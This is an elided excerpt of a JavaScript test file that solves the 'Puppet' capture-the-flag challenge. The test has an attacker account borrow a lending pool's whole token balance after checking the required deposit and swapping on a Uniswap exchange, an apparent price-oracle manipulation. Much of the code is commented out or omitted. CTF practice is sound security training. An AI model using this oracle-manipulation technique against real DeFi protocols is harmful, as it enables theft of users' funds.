...
const { constants } = require("@ethereum-waffle/provider/node_modules/ethers");
...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    // console.log(POOL_INITIAL_TOKEN_BALANCE.toString());

    //     const overall_tokens = ATTACKER_INITIAL_TOKEN_BALANCE.add(
    //       ATTACKER_INITIAL_ETH_BALANCE.div(2)
    //     );
    //     console.log(
    //       overall_tokens *
    //         calculateTokenToEthInputPrice(
    ...
    //     const eth_to_get = calculateTokenToEthInputPrice(
    ...
    const balance_after = await ethers.provider.getBalance(attacker.address);
    console.log("ETH balance after: ", balance_after.toString());

    const deposit_after = await this.lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    console.log("Deposit required after:", deposit_after.toString());

    console.log("Has enough: ", balance_after >= deposit_after);

    await this.lendingPool
      .connect(attacker)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit_after });
    ...
    await this.uniswapExchange
      ...
      .ethToTokenSwapInput(
        ...
        {
          value: 1000, // We could swap more here.
          gasLimit: 1e6,
        }
      );
  });
